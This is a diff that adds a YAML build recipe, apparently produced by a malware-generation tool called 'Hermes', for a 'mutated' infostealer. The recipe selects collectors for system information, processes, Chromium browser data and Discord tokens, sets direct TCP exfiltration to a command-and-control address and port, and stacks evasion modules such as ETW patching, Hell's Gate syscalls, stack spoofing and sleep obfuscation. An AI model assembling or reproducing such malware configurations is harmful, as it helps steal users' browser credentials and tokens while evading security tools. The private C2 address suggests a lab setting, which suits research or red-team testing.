@@ -1,0 +1,27 @@
+name: infostealer_cs_mutated_v3
+description: Auto-generated recipe by Hermes (c)
+core:
+- core/emit_buffer
+- core/run_cmd
+- core/file_ops
+collectors:
+- collectors/system_info
+- collectors/processes
+- collectors/browser_chromium
+- collectors/discord_tokens
+exfil: exfil/tcp_direct
+arch: arch/sequential
+resources: true
+api_resolve: api_resolve/ldr_get_proc
+evasion:
+- evasion/etw_patch
+- evasion/sleep_ekko
+- evasion/hells_gate
+- evasion/stack_spoof
+- evasion/sleep_jitter
+- evasion/entropy_pad
+- evasion/header_stomp
+- evasion/debug_dir_strip
+vars:
+  C2_IP: 10.0.2.2
+  C2_PORT: '9001'
